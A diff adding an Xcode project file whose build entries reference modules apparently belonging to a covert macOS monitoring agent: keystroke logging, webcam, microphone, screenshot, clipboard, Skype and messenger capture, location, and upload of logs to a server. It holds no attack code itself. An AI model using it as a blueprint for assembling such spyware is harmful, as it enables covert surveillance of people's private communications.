@@ -1,0 +1,1810 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 46;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		1A00BF9913019C8000783D4E /* RCSMAgentOrganizer.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AFBE66412A0082600BFA7D0 /* RCSMAgentOrganizer.m */; };
+		1A00BFAE1302D33700783D4E /* RCSMAgentOrganizerTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A00BFAD1302D33700783D4E /* RCSMAgentOrganizerTest.m */; };
+		1A10796012E721320063759B /* AuthNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F7C812DF071C00BEACB8 /* AuthNetworkOperation.m */; };
+		1A10796212E721320063759B /* IDNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */; };
+		1A10796412E721320063759B /* ConfNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */; };
+		1A10796612E721320063759B /* DownloadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */; };
+		1A10796812E721320063759B /* UploadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */; };
+		1A10796A12E721320063759B /* FSNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */; };
+		1A10796C12E721320063759B /* LogNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */; };
+		1A10796E12E721320063759B /* ByeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */; };
+		1A10796F12E721560063759B /* Transport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A5B320C12E4A2AF00677A0B /* Transport.m */; };
+		1A10797012E721560063759B /* RESTTransport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F81712DF293A00BEACB8 /* RESTTransport.m */; };
+		1A10797112E721560063759B /* RESTNetworkProtocol.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */; };
+		1A10797312E721850063759B /* GHUnit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A10797212E721850063759B /* GHUnit.framework */; };
+		1A10797812E721A70063759B /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
+		1A10798912E722590063759B /* GHUnitTestMain.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A10798812E722590063759B /* GHUnitTestMain.m */; };
+		1A10798E12E722AB0063759B /* RESTNetworkProtocolTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A10798D12E722AB0063759B /* RESTNetworkProtocolTest.m */; };
+		1A107A6312E723FE0063759B /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
+		1A107A6412E724080063759B /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A43C9650FFA641A008E5EFE /* IOKit.framework */; };
+		1A107BD212E730800063759B /* AuthNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A107BD112E730800063759B /* AuthNetworkOperationTest.m */; };
+		1A107BF612E737060063759B /* RESTTransportTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A107BF512E737060063759B /* RESTTransportTest.m */; };
+		1A12A0BE1095A99F0090C4D7 /* CoreAudio.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */; };
+		1A12A0F21095BD350090C4D7 /* QTKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0F11095BD350090C4D7 /* QTKit.framework */; };
+		1A13FE4612F9B4F800B82938 /* RCSMLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A13FE4512F9B4F800B82938 /* RCSMLogger.m */; };
+		1A13FE4712F9B4F800B82938 /* RCSMLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A13FE4512F9B4F800B82938 /* RCSMLogger.m */; };
+		1A17CC611281B440001A74BD /* mach_override.mm in Sources */ = {isa = PBXBuildFile; fileRef = 1A12A14F1095F24C0090C4D7 /* mach_override.mm */; };
+		1A17CC621281B44A001A74BD /* RCSMAgentVoipSkype.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A12A0181091FE8C0090C4D7 /* RCSMAgentVoipSkype.m */; };
+		1A1A2FD010611067001F1B5D /* RCSMAgentWebcam.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1A2FCF10611067001F1B5D /* RCSMAgentWebcam.m */; };
+		1A1A2FDF106112CF001F1B5D /* QuickTime.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A1A2FDE106112CF001F1B5D /* QuickTime.framework */; };
+		1A1B9CD60FA091970036558C /* spref.icns in Resources */ = {isa = PBXBuildFile; fileRef = 1A1B9CD50FA091970036558C /* spref.icns */; };
+		1A281C990FF3CAC800616589 /* RCSMAgentClipboard.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */; };
+		1A28786D12F062A80008973A /* UploadNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A28786C12F062A80008973A /* UploadNetworkOperationTest.m */; };
+		1A28798612F080B20008973A /* FSNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A28798512F080B20008973A /* FSNetworkOperationTest.m */; };
+		1A319EE50FA9B6410079B060 /* RCSMInputManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A319EE40FA9B6410079B060 /* RCSMInputManager.m */; };
+		1A319F090FA9C8260079B060 /* Info in Resources */ = {isa = PBXBuildFile; fileRef = 1A319F080FA9C8260079B060 /* Info */; };
+		1A319F1F0FA9ED520079B060 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
+		1A319F880FAA02640079B060 /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
+		1A33F4B20FC69D1800590FA1 /* RCSMTaskManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF92B710F8F4A90009ED774 /* RCSMTaskManager.m */; };
+		1A33F4F30FC6AA9400590FA1 /* RCSMAgentScreenshot.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */; };
+		1A33F8EC0FCC1EB000590FA1 /* RCSMEvents.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A33F8EB0FCC1EB000590FA1 /* RCSMEvents.m */; };
+		1A3A07A51005F588003EE323 /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A43C9650FFA641A008E5EFE /* IOKit.framework */; };
+		1A43C9660FFA641A008E5EFE /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A43C9650FFA641A008E5EFE /* IOKit.framework */; };
+		1A4435230F8CA23E00CD910E /* NSMutableData+AES128.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435220F8CA23E00CD910E /* NSMutableData+AES128.m */; };
+		1A4435490F8CB10800CD910E /* NSString+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435480F8CB10800CD910E /* NSString+SHA1.m */; };
+		1A4436590F8CD55400CD910E /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
+		1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */; };
+		1A508B0511A6B1F20067BF81 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
+		1A521EC512FAB9550091ADD5 /* UpgradeNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A521EC412FAB9550091ADD5 /* UpgradeNetworkOperationTest.m */; };
+		1A521ECB12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A521EC912FABAC00091ADD5 /* UpgradeNetworkOperation.m */; };
+		1A5509B113618F9A00D1A2AD /* RCSMAgentFileCapture.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A5509B013618F9A00D1A2AD /* RCSMAgentFileCapture.m */; };
+		1A68E0BA0FB8838400B17F60 /* RCSMAgentIMSkype.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */; };
+		1A68E1530FB9A3B800B17F60 /* RCSMAgentInputLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E1520FB9A3B800B17F60 /* RCSMAgentInputLogger.m */; };
+		1A68E3700FBB1F3200B17F60 /* RCSMAgentURL.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */; };
+		1A7A94160FE13EC7007FF947 /* RCSMActions.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7A94150FE13EC7007FF947 /* RCSMActions.m */; };
+		1A7FD31912F17EED00361B0B /* LogNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD31812F17EED00361B0B /* LogNetworkOperationTest.m */; };
+		1A7FD34012F1841200361B0B /* NSData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD33F12F1841200361B0B /* NSData+SHA1.m */; };
+		1A7FD34112F1841200361B0B /* NSData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD33F12F1841200361B0B /* NSData+SHA1.m */; };
+		1A7FD43D12F1CED900361B0B /* RCSMFileSystemManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD43C12F1CED900361B0B /* RCSMFileSystemManager.m */; };
+		1A7FD44112F1D28100361B0B /* RCSMFileSystemManagerTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD44012F1D28100361B0B /* RCSMFileSystemManagerTest.m */; };
+		1A7FD44212F1D29D00361B0B /* RCSMFileSystemManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD43C12F1CED900361B0B /* RCSMFileSystemManager.m */; };
+		1A8A7877130027610024B9CF /* RCSMAgentOrganizer.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AFBE66412A0082600BFA7D0 /* RCSMAgentOrganizer.m */; };
+		1A8CB950132665D1005579F9 /* RCSMAgentMicrophone.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */; };
+		1A8CB953132666E5005579F9 /* AudioToolbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A8CB952132666E5005579F9 /* AudioToolbox.framework */; };
+		1A8CB95613278ECB005579F9 /* RCSMAgentMicrophoneTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A8CB95513278ECB005579F9 /* RCSMAgentMicrophoneTest.m */; };
+		1A8CB957132791E4005579F9 /* RCSMAgentMicrophone.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */; };
+		1A8CB9591327928C005579F9 /* AudioToolbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A8CB9581327928B005579F9 /* AudioToolbox.framework */; };
+		1A8D88490FC2B07C0067A45D /* RCSMEncryption.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434D60F8C907000CD910E /* RCSMEncryption.m */; };
+		1A8D8E210FC43E420067A45D /* RCSMConfManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434840F8B950B00CD910E /* RCSMConfManager.m */; };
+		1A9BB24E0FE8EF2600846023 /* RCSMLogManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */; };
+		1AA1373212F6EFC900E0CD52 /* AuthNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F7C812DF071C00BEACB8 /* AuthNetworkOperation.m */; };
+		1AA1373312F6EFC900E0CD52 /* IDNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */; };
+		1AA1373412F6EFC900E0CD52 /* ConfNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */; };
+		1AA1373512F6EFC900E0CD52 /* DownloadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */; };
+		1AA1373612F6EFC900E0CD52 /* UploadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */; };
+		1AA1373712F6EFC900E0CD52 /* FSNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */; };
+		1AA1373812F6EFC900E0CD52 /* LogNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */; };
+		1AA1373912F6EFC900E0CD52 /* ByeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */; };
+		1AA1373A12F6EFDD00E0CD52 /* Transport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A5B320C12E4A2AF00677A0B /* Transport.m */; };
+		1AA1373B12F6EFDD00E0CD52 /* RESTTransport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F81712DF293A00BEACB8 /* RESTTransport.m */; };
+		1AA1373C12F6EFDD00E0CD52 /* RESTNetworkProtocol.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */; };
+		1AA1376912F6FA2B00E0CD52 /* NSString+Pascal.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6077A12EDE2160091F6F6 /* NSString+Pascal.m */; };
+		1AA1376C12F6FA7100E0CD52 /* NSMutableData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6072812EDCAC30091F6F6 /* NSMutableData+SHA1.m */; };
+		1AA84481113C22FE005FBADB /* libspeex.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AA84480113C22FE005FBADB /* libspeex.a */; };
+		1AA84485113C26D1005FBADB /* libz.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AA84484113C26D1005FBADB /* libz.a */; };
+		1AAF6FC912FB0A7E00D3E581 /* RCSMLoggerTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AAF6FC812FB0A7E00D3E581 /* RCSMLoggerTest.m */; };
+		1AAF6FCE12FB0B2900D3E581 /* RCSMLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A13FE4512F9B4F800B82938 /* RCSMLogger.m */; };
+		1AB5DC4111CF9DE600B9E32B /* NSApplication+SystemVersion.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AB5DC4011CF9DE600B9E32B /* NSApplication+SystemVersion.m */; };
+		1ABE7E7B0F7CE6ED00BC61B1 /* RCSMUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7E7A0F7CE6ED00BC61B1 /* RCSMUtils.m */; };
+		1ABEEE2E0F975CE100063113 /* RCSMCore.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABEEE2D0F975CE100063113 /* RCSMCore.m */; };
+		1AC279A813584222009C0812 /* RCSMAgentIMMsnMessenger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AC279A713584222009C0812 /* RCSMAgentIMMsnMessenger.m */; };
+		1AC279A913584222009C0812 /* RCSMAgentIMMsnMessenger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AC279A713584222009C0812 /* RCSMAgentIMMsnMessenger.m */; };
+		1AD1D6C11099EB96005B548F /* QTKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0F11095BD350090C4D7 /* QTKit.framework */; };
+		1AD1D6C81099EBAF005B548F /* QuartzCore.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD1D6C71099EBAF005B548F /* QuartzCore.framework */; };
+		1AD4328812A3E3CF00B472C3 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD4328712A3E3CF00B472C3 /* AddressBook.framework */; };
+		1AD53606101067D800AC54D8 /* Security.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF92CC50F947FEE009ED774 /* Security.framework */; };
+		1AD6C55312E7443D00DEE42D /* NSMutableData+AES128.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435220F8CA23E00CD910E /* NSMutableData+AES128.m */; };
+		1AD6C55412E7443D00DEE42D /* NSString+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435480F8CB10800CD910E /* NSString+SHA1.m */; };
+		1AEB9541138E94480057EB42 /* RCSMInfoManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AEB9540138E94480057EB42 /* RCSMInfoManager.m */; };
+		1AEB9542138E94480057EB42 /* RCSMInfoManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AEB9540138E94480057EB42 /* RCSMInfoManager.m */; };
+		1AF15F1811DC8E0100637F4E /* AppKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF15F1711DC8E0100637F4E /* AppKit.framework */; };
+		1AF6069F12EDAEA90091F6F6 /* ByeNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6069E12EDAEA90091F6F6 /* ByeNetworkOperationTest.m */; };
+		1AF6072912EDCAC30091F6F6 /* NSMutableData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6072812EDCAC30091F6F6 /* NSMutableData+SHA1.m */; };
+		1AF6074A12EDD5A70091F6F6 /* IDNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6074912EDD5A70091F6F6 /* IDNetworkOperationTest.m */; };
+		1AF6077B12EDE2160091F6F6 /* NSString+Pascal.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6077A12EDE2160091F6F6 /* NSString+Pascal.m */; };
+		1AF607A112EED0A40091F6F6 /* NSString+PascalTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF607A012EED0A40091F6F6 /* NSString+PascalTest.m */; };
+		1AF608B612EF0E310091F6F6 /* ConfNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF608B512EF0E310091F6F6 /* ConfNetworkOperationTest.m */; };
+		1AF6091212EF1E5D0091F6F6 /* RCSMTaskManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF92B710F8F4A90009ED774 /* RCSMTaskManager.m */; };
+		1AF6091712EF1E990091F6F6 /* RCSMConfManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434840F8B950B00CD910E /* RCSMConfManager.m */; };
+		1AF6091812EF1E990091F6F6 /* RCSMLogManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */; };
+		1AF6091912EF1E990091F6F6 /* RCSMEvents.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A33F8EB0FCC1EB000590FA1 /* RCSMEvents.m */; };
+		1AF6091A12EF1E990091F6F6 /* RCSMActions.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7A94150FE13EC7007FF947 /* RCSMActions.m */; };
+		1AF6091D12EF1ECB0091F6F6 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
+		1AF6091E12EF1ECB0091F6F6 /* RCSMAgentWebcam.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1A2FCF10611067001F1B5D /* RCSMAgentWebcam.m */; };
+		1AF6091F12EF1ECB0091F6F6 /* RCSMAgentScreenshot.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */; };
+		1AF6092112EF1ECB0091F6F6 /* RCSMEncryption.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434D60F8C907000CD910E /* RCSMEncryption.m */; };
+		1AF60BA512EF1EED0091F6F6 /* libz.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AA84484113C26D1005FBADB /* libz.a */; };
+		1AF60BA612EF1EED0091F6F6 /* libspeex.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AA84480113C22FE005FBADB /* libspeex.a */; };
+		1AF60BA712EF1EED0091F6F6 /* QuartzCore.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD1D6C71099EBAF005B548F /* QuartzCore.framework */; };
+		1AF60BA812EF1EED0091F6F6 /* QTKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0F11095BD350090C4D7 /* QTKit.framework */; };
+		1AF60BA912EF1EED0091F6F6 /* CoreAudio.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */; };
+		1AF60BAA12EF1EED0091F6F6 /* QuickTime.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A1A2FDE106112CF001F1B5D /* QuickTime.framework */; };
+		1AF60BAB12EF1EED0091F6F6 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 29B97325FDCFA39411CA2CEA /* Foundation.framework */; };
+		1AF60BAC12EF1EED0091F6F6 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
+		1AF60BAD12EF1EED0091F6F6 /* ScriptingBridge.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 521DA5FD125C884000A3D49E /* ScriptingBridge.framework */; };
+		1AF60BAE12EF1EED0091F6F6 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD4328712A3E3CF00B472C3 /* AddressBook.framework */; };
+		1AF60BE412EF27B50091F6F6 /* DownloadNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60BE312EF27B50091F6F6 /* DownloadNetworkOperationTest.m */; };
+		1AF60C0412EF2B880091F6F6 /* NSData+Pascal.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */; };
+		1AF60C0512EF2B880091F6F6 /* NSData+Pascal.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */; };
+		1AF60C0E12EF2CC10091F6F6 /* NSData+PascalTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60C0D12EF2CC10091F6F6 /* NSData+PascalTest.m */; };
+		1AF60C4212F028A00091F6F6 /* OCMock.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF60C4112F028A00091F6F6 /* OCMock.framework */; };
+		1AF610290FA75A2B003F2C12 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
+		1AF92CB10F947D53009ED774 /* spref.tiff in Resources */ = {isa = PBXBuildFile; fileRef = 1AF92CB00F947D53009ED774 /* spref.tiff */; };
+		520F50A61529FD920083B11E /* RCSMAgentIMAdium.m in Sources */ = {isa = PBXBuildFile; fileRef = 520F50A51529FD920083B11E /* RCSMAgentIMAdium.m */; };
+		521ABB3A132F9FDF00DC54A8 /* Apple80211 in Frameworks */ = {isa = PBXBuildFile; fileRef = 521ABB39132F9FDF00DC54A8 /* Apple80211 */; };
+		521ABB3C132FA01B00DC54A8 /* SystemConfiguration.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 521ABB3B132FA01B00DC54A8 /* SystemConfiguration.framework */; };
+		521B22C61312BA360077A491 /* RCSMAgentPosition.m in Sources */ = {isa = PBXBuildFile; fileRef = 521B22C51312BA360077A491 /* RCSMAgentPosition.m */; };
+		521DA5FE125C884000A3D49E /* ScriptingBridge.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 521DA5FD125C884000A3D49E /* ScriptingBridge.framework */; };
+		5262A948132A5AB4001D1988 /* RCSMAgentDevice.m in Sources */ = {isa = PBXBuildFile; fileRef = 5262A947132A5AB4001D1988 /* RCSMAgentDevice.m */; };
+		5262A949132A6755001D1988 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
+		5269F6231330ED7200644B72 /* RCSMAgentApplication.m in Sources */ = {isa = PBXBuildFile; fileRef = 5269F6221330ED7200644B72 /* RCSMAgentApplication.m */; };
+		529A87BA14C4257100411539 /* RCSMDiskQuota.m in Sources */ = {isa = PBXBuildFile; fileRef = 529A87B914C4257100411539 /* RCSMDiskQuota.m */; };
+		529CA8AB1464304100B92C47 /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = 529CA8A91464304100B92C47 /* InfoPlist.strings */; };
+		529CA8AE1464304100B92C47 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 529CA8AD1464304100B92C47 /* main.m */; };
+		529CA8B3146430DF00B92C47 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 529CA8B2146430DF00B92C47 /* Foundation.framework */; };
+		529CA8B4146430F800B92C47 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
+		529CA8B5146431A500B92C47 /* RCSMLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A13FE4512F9B4F800B82938 /* RCSMLogger.m */; };
+		52B8504115146D4E00F0D72E /* NSObject+SBJson.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8502715146D4E00F0D72E /* NSObject+SBJson.m */; };
+		52B8504215146D4E00F0D72E /* RCSIJSonConfiguration.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8502915146D4E00F0D72E /* RCSIJSonConfiguration.m */; };
+		52B8504315146D4E00F0D72E /* SBJsonParser.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8502C15146D4E00F0D72E /* SBJsonParser.m */; };
+		52B8504415146D4E00F0D72E /* SBJsonStreamParser.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8502E15146D4E00F0D72E /* SBJsonStreamParser.m */; };
+		52B8504515146D4E00F0D72E /* SBJsonStreamParserAccumulator.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503015146D4E00F0D72E /* SBJsonStreamParserAccumulator.m */; };
+		52B8504615146D4E00F0D72E /* SBJsonStreamParserAdapter.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503215146D4E00F0D72E /* SBJsonStreamParserAdapter.m */; };
+		52B8504715146D4E00F0D72E /* SBJsonStreamParserState.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503415146D4E00F0D72E /* SBJsonStreamParserState.m */; };
+		52B8504815146D4E00F0D72E /* SBJsonStreamWriter.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503615146D4E00F0D72E /* SBJsonStreamWriter.m */; };
+		52B8504915146D4E00F0D72E /* SBJsonStreamWriterAccumulator.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503815146D4E00F0D72E /* SBJsonStreamWriterAccumulator.m */; };
+		52B8504A15146D4E00F0D72E /* SBJsonStreamWriterState.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503A15146D4E00F0D72E /* SBJsonStreamWriterState.m */; };
+		52B8504B15146D4E00F0D72E /* SBJsonTokeniser.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503C15146D4E00F0D72E /* SBJsonTokeniser.m */; };
+		52B8504C15146D4E00F0D72E /* SBJsonUTF8Stream.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8503E15146D4E00F0D72E /* SBJsonUTF8Stream.m */; };
+		52B8504D15146D4E00F0D72E /* SBJsonWriter.m in Sources */ = {isa = PBXBuildFile; fileRef = 52B8504015146D4E00F0D72E /* SBJsonWriter.m */; };
+		52CE814B14C6FE500029421E /* mach_override.mm in Sources */ = {isa = PBXBuildFile; fileRef = 1A12A14F1095F24C0090C4D7 /* mach_override.mm */; };
+		52D8361E1393915B00C18E70 /* libFFurlLib32.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 52D8361C1393915B00C18E70 /* libFFurlLib32.a */; };
+		52D8361F1393915B00C18E70 /* libFFurlLib64.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 52D8361D1393915B00C18E70 /* libFFurlLib64.a */; };
+		52D836251393916B00C18E70 /* libmozalloc.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 52D836211393916B00C18E70 /* libmozalloc.dylib */; };
+		52D836261393916B00C18E70 /* libnspr4.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 52D836221393916B00C18E70 /* libnspr4.dylib */; };
